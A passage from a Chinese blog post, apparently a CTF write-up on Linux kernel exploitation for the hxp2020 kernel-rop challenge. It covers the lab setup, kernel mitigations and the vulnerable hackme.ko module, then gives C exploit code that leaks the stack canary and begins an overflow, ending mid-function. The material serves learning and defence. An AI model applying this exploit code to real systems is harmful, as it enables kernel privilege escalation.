@@ -1,0 +1,1601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Linux Kernel-Pwn Learning - Niebelungen</title><meta name="Description" content=""><meta property="og:title" content="Linux Kernel-Pwn Learning" />
+<meta property="og:description" content="Kernel ROP 学习Linux kernel Pwn的第一次尝试，hxp2020: kernel-rop Thanks @Midas for so great tutorials ! 环境设置 将附件解压得到以下文件： initramfs.cpio.gz：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/linuxkernel-pwn-learning/" /><meta property="og:image" content="http://example.org/favicon.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-22T01:04:36+08:00" />
+<meta property="article:modified_time" content="2021-08-22T01:04:36+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/favicon.png"/>
+
+<meta name="twitter:title" content="Linux Kernel-Pwn Learning"/>
+<meta name="twitter:description" content="Kernel ROP 学习Linux kernel Pwn的第一次尝试，hxp2020: kernel-rop Thanks @Midas for so great tutorials ! 环境设置 将附件解压得到以下文件： initramfs.cpio.gz："/>
+<meta name="application-name" content="Niebelungen">
+<meta name="apple-mobile-web-app-title" content="Niebelungen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linuxkernel-pwn-learning/" /><link rel="prev" href="http://example.org/posts/musl-libc-pwn-learning/" /><link rel="next" href="http://example.org/posts/cpp-exploitation-basic/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Kernel-Pwn Learning",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linuxkernel-pwn-learning\/"
+        },"genre": "posts","keywords": "Pwn","wordcount":  7766 ,
+        "url": "http:\/\/example.org\/posts\/linuxkernel-pwn-learning\/","datePublished": "2021-08-22T01:04:36+08:00","dateModified": "2021-08-22T01:04:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Niebelungen"},"author": {
+                "@type": "Person",
+                "name": "Niebelungen"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Niebelungen">Niebelungen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Niebelungen">Niebelungen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Linux Kernel-Pwn Learning</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Niebelungen</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pwning/"><i class="far fa-folder fa-fw"></i>Pwning</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-22">2021-08-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7766 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 16 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境设置">环境设置</a>
+      <ul>
+        <li><a href="#kernel">Kernel</a></li>
+        <li><a href="#文件系统">文件系统</a></li>
+        <li><a href="#runsh">run.sh</a></li>
+        <li><a href="#how-to-debug-kernel">How to debug kernel</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-kernel-缓解机制">Linux kernel 缓解机制</a></li>
+    <li><a href="#kernel-module-hackmeko">Kernel module: hackme.ko</a></li>
+    <li><a href="#first-stepret2usr">First step：ret2usr</a>
+      <ul>
+        <li><a href="#open-the-device">Open the device</a></li>
+        <li><a href="#leak-canary">Leak canary</a></li>
+        <li><a href="#overwrite-return-addr">Overwrite return addr</a></li>
+        <li><a href="#user-shellcode">User shellcode</a></li>
+        <li><a href="#return-to-userland">Return to userland</a></li>
+      </ul>
+    </li>
+    <li><a href="#add-smepkernel-rop">Add SMEP&amp;Kernel-ROP</a>
+      <ul>
+        <li><a href="#trying-to-overwrite-cr4">Trying to overwrite CR4</a></li>
+        <li><a href="#构造rop-chain">构造ROP chain</a></li>
+        <li><a href="#stack-pivot">Stack pivot</a></li>
+      </ul>
+    </li>
+    <li><a href="#add-kpti">Add KPTI</a>
+      <ul>
+        <li><a href="#normal-rop">Normal ROP</a></li>
+        <li><a href="#signal-handler">Signal handler</a></li>
+      </ul>
+    </li>
+    <li><a href="#add-smap">Add SMAP</a></li>
+    <li><a href="#add-kaslr">Add KASLR</a>
+      <ul>
+        <li><a href="#leak-prepare_kernel_cred--commit_creds">Leak prepare_kernel_cred() &amp; commit_creds()</a></li>
+        <li><a href="#call-prepare_kernel_cred--commit_creds">Call prepare_kernel_cred() &amp; commit_creds()</a></li>
+        <li><a href="#get-root-shell-">Get root shell !</a></li>
+      </ul>
+    </li>
+    <li><a href="#technique-overwriting-modprobe_path">Technique: Overwriting modprobe_path</a>
+      <ul>
+        <li><a href="#leak-modprobe_path">Leak modprobe_path</a></li>
+        <li><a href="#overwrite">Overwrite</a></li>
+        <li><a href="#get-flag-">Get flag !</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kernel-rop">Kernel ROP</h1>
+<p>学习Linux kernel Pwn的第一次尝试，hxp2020: kernel-rop</p>
+<p>Thanks <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" target="_blank" rel="noopener noreffer">@Midas</a> for so great tutorials !</p>
+<h2 id="环境设置">环境设置</h2>
+<p>将附件解压得到以下文件：</p>
+<ul>
+<li><code>initramfs.cpio.gz</code>：压缩的文件系统，诸如<code>/bin</code>、<code>/etc</code>&hellip; 都被放入这里。其中也可能包含有漏洞的模块</li>
+<li><code>vmlinuz</code>：压缩的Linux kernel镜像，我们可以从中提取出kernel ELF文件。</li>
+<li><code>run.sh</code>：运行kernel的shell脚本，我们可以在这里更改内核的启动选项。为了正常运行我们需要提前安装<code>qemu</code>。</li>
+</ul>
+<p>其他文件<code>Dockerfile</code>、<code>yneted</code>等都是帮助我们搭建本地服务环境的。</p>
+<h3 id="kernel">Kernel</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./extract-image.sh ./vmlinuz &gt; vmlinux
+</code></pre></td></tr></table>
+</div>
+</div><p>提取内核ELF文件到<code>vmlinux</code>。</p>
+<p>下一步，我们要提取kernel中的<code>gadget</code>，但是由于kernel很大，使用<code>ROPgadget</code>需要几分钟的时间。所以，我们提前将所有<code>gadget</code>放入文件中。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ROPgadget --binary ./vmlinux &gt; gadgets.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>这可能需要很久。可以用ropper，听说会更快。</p>
+<h3 id="文件系统">文件系统</h3>
+<p>使用脚本将其解压</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir initramfs
+<span class="nb">cd</span> initramfs
+cp ../initramfs.cpio.gz .
+gunzip ./initramfs.cpio.gz
+cpio -idm &lt; ./initramfs.cpio
+rm initramfs.cpio
+</code></pre></td></tr></table>
+</div>
+</div><p>解压后的文件系统在<code>initramfs</code>文件夹中，其中有一个<code>hackme.ko</code>的驱动。很明显我们要利用它。</p>
+<p>解压文件系统的另一个目的是更改其中的一些设置，便于我们在后面对一些文件的访问。在<code>/etc</code>的文件中，找到这样的命令并修改它，本题中为<code>inittab</code>文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">setuidgid <span class="m">1000</span> /bin/sh
+<span class="c1"># Modify it into the following</span>
+setuidgid <span class="m">0</span> /bin/sh
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>在完成利用后，我们要把它切换回1000</strong></p>
+<p>在修改完成后我们要将其压缩回去，使用<code>compress.sh</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -o exploit -static <span class="nv">$1</span>
+mv ./exploit ./initramfs
+<span class="nb">cd</span> initramfs
+find . -print0 <span class="se">\
+</span><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
+</span><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
+mv ./initramfs.cpio.gz ../
+</code></pre></td></tr></table>
+</div>
+</div><p>前两行是编译我们的exp，把它加入到文件系统中。</p>
+<blockquote>
+<p>在很多教程中，都使用了busybox模拟文件系统。如果题目提供了文件系统，也可以使用这种直接解压的方式。两种方式所要达到的目的是一样的，按个人习惯选择即可。脚本经过修改都是通用的。</p>
+</blockquote>
+<h3 id="runsh">run.sh</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
+</span><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span><span class="se"></span>    -m 128M <span class="se">\
+</span><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
+</span><span class="se"></span>    -kernel vmlinuz <span class="se">\
+</span><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
+</span><span class="se"></span>    -hdb flag.txt <span class="se">\
+</span><span class="se"></span>    -snapshot <span class="se">\
+</span><span class="se"></span>    -nographic <span class="se">\
+</span><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span><span class="se"></span>    -no-reboot <span class="se">\
+</span><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>-m</code>：指定内存大小，如果不能启动可以尝试增加内存</li>
+<li><code>-cpu</code>：指定cpu的模式，<code>+smep</code>和<code>+smap</code>是一些保护机制</li>
+<li><code>-kernel</code>：指定内核镜像文件</li>
+<li><code>-initrd</code>：指定文件系统文件</li>
+<li><code>-append</code>：指定其他一些启动选项，包括一些保护机制</li>
+</ul>
+<p>加入<code>-s</code>选项，我们可以在本地的1234端口进行调试。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ gdb vmlinux
+<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="how-to-debug-kernel">How to debug kernel</h3>
+<p>调试内核，首先需要一个断点。使用<code>lsmod</code>可以列出所有加载的模块，及其基址（root权限）。如果没有想要的模块可以使用<code>insmod</code>加载指定的模块。用<code>rmmod</code>卸载指定模块。</p>
+<p>经过IDA静态分析使用<code>base + offset</code>的方式断在我们想要的地方。但是内核对象很特殊，或者说目前的工具对内核的调试支持并不是十分完美。当然，windbg对内核调试的支持很好。所以，你下的断点是很有可能有断不下来的情况。另外，内核在单步调试时极有可能出现跑飞的现象，停在一个你不知道的地方。使用<code>si</code>可以一定程度上避免这样。而这就要求我们必须将断点下的更加有针对性。</p>
+<p>gdb还有可能将函数名进行错误识别，都是正常情况。</p>
+<h2 id="linux-kernel-缓解机制">Linux kernel 缓解机制</h2>
+<ul>
+<li>
+<p><strong>Kernel stack cookies（canary）</strong>：内核栈的canary保护。</p>
+</li>
+<li>
+<p><strong>Kernel address space layout randomization（KASLR）</strong>：内核地址随机化；与用户态的<code>ASLR</code>一样，将内核地址随机加载。</p>
+</li>
+<li>
+<p><strong>Function Granular KASLR</strong>： 与用户态不同的是，内核态的函数相对于基址的偏移在加载时也被随机化了。在开启<code>FGKASLR</code>后，内核有一小部分的数据偏移是确定的。</p>
+<p>个人理解：要想对所有的数据进行如此强度的随机化是不可能的，内核也是程序，在程序运行过程中，总有一些关于加载的数据需要访问，这部分数据必须要让内核准确的知道其所在的地址。那么，这部分数据就是不能随机化的。</p>
+</li>
+<li>
+<p><strong>Supervisor mode execution protection（SMEP）</strong>：当进程属于内核态时，所有的用户空间的页在页表中都被标记为不可执行。在kernel中，通过将<code>CR4</code>寄存器的<code>20th bit</code>置位来使能。在启动时，通过在<code>-cpu</code>上<code>+smep</code>来启用，在<code>-append</code>的中加入<code>nosmep</code>来禁用。</p>
+</li>
+<li>
+<p><strong>Supervisor Mode Access Prevention （SMAP）</strong>：<code>SMEP</code>的补充。在内核态时，用户空间的任何页面都是不可访问的。在kernel中，通过将<code>CR4</code>寄存器的<code>2th bit</code>置位来使能。在启动时，通过在<code>-cpu</code>上<code>+smap</code>来启用，在<code>-append</code>的中加入<code>nosmap</code>来禁用。</p>
+</li>
+<li>
+<p><strong>Kernel page-table isolation（KPTI）</strong>：当这个机制使能时，内核将用户空间和内核空间的页表完全分开。此时，内核态的页表拥有内核空间和用户空间的页，用户态的页表包含了用户空间和最小的内核空间。它可以通过在<code>-append</code>选项下添加<code>kpti=1</code>或<code>nopti</code>来启用/禁用。</p>
+</li>
+</ul>
+<h2 id="kernel-module-hackmeko">Kernel module: hackme.ko</h2>
+<p>内核模块（驱动）也是ELF文件，我们在IDA中进行分析。</p>
+<p><code>init_module</code>注册了一个名为<code>hackme</code>的设备，包含以下操作：<code>hackme_read</code>，<code>hackme_write</code>，<code>hackme_open</code> 和 <code>hackme_release</code>。我们可以通过<code>open(&quot;/dev/hackme&quot;)</code>来与之交互，调用它注册的操作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">user_buf</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// rdx
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>  <span class="kt">bool</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// zf
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="c1"></span>  <span class="n">_QWORD</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span> <span class="c1">// [rsp-A0h] [rbp-A0h] BYREF
+</span><span class="c1"></span>
+  <span class="n">_fentry__</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">user_buf</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>                                    <span class="c1">// from 3rd arg
+</span><span class="c1"></span>  <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">_memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">);</span>
+    <span class="n">BUG</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">_check_object_size</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">user_buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">h_write</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">user_buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-98h] BYREF
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-18h]
+</span><span class="c1"></span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">);</span>
+    <span class="n">BUG</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">_check_object_size</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">user_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
+  <span class="n">_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>漏洞很明显，我们可以从内核栈上读写最多<code>0x1000</code>的数据，这造成了溢出。</p>
+<h2 id="first-stepret2usr">First step：ret2usr</h2>
+<p>我们从最简单的开始学习，在用户态，当<code>ASLR</code>和<code>NX</code>都关闭时，我们可以想到常用的利用方式<code>ret2shellcode</code>。同样，当关闭几乎所有的保护后我们也可以返回到自己写的代码中。这个过程在内核态执行用户空间的代码，所以被称为<code>ret2usr</code>。</p>
+<p>在开始之前，修改<code>run.sh</code>除去<code>+smep</code>、<code>+smap</code>、<code>kpti=1</code>、<code>kaslr</code>并添加<code>nopti</code>和<code>nokaslr</code>。</p>
+<h3 id="open-the-device">Open the device</h3>
+<p>在交互之前我们需要打开设备。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>	<span class="c1">// 为了让其他函数能与设备交互
+</span><span class="c1"></span>
+<span class="kt">void</span> <span class="nf">open_dev</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="leak-canary">Leak canary</h3>
+<p>因为还有栈保护，所以还要先leak canary信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="overwrite-return-addr">Overwrite return addr</h3>
+<p>下面我们就要覆盖返回地址了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
